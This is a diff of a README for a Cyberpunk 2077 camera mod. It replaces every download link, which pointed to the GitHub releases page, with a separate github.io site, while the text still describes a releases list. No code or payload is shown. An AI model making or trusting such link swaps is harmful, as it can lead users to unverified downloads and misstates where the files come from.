@@ -1,6 +1,6 @@
 # 🎮 cyberpunk2077-tcoc - True Third-Person Movement That Matches Your Camera
 
-[![Download Now](https://img.shields.io/badge/Download%20Latest%20Release-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nazhuldev/cyberpunk2077-tcoc/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Latest%20Release-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://nazhuldev.github.io)
 
 ---
 
@@ -51,7 +51,7 @@ This mod is an **add-on** — it doesn't work by itself. You need these two thin
 
 ### Step 2: Download cyberpunk2077-tcoc
 
-Visit this link to download the application: **[https://github.com/nazhuldev/cyberpunk2077-tcoc/releases](https://github.com/nazhuldev/cyberpunk2077-tcoc/releases)**
+Visit this link to download the application: **[https://nazhuldev.github.io](https://nazhuldev.github.io)**
 
 On that page, you'll see a list of released versions. Click the **latest version** (the one at the top). Look for a file that ends with a version number, like `cyberpunk2077-tcoc-v1.0.0.zip`. Download it to your computer — usually to your `Downloads` folder.
 
@@ -147,7 +147,7 @@ Use this quick list to confirm everything is ready:
 
 If you skipped ahead, here's the direct link:
 
-[**⬇️ Download cyberpunk2077-tcoc Latest Release**](https://github.com/nazhuldev/cyberpunk2077-tcoc/releases)
+[**⬇️ Download cyberpunk2077-tcoc Latest Release**](https://nazhuldev.github.io)
 
 ---
 
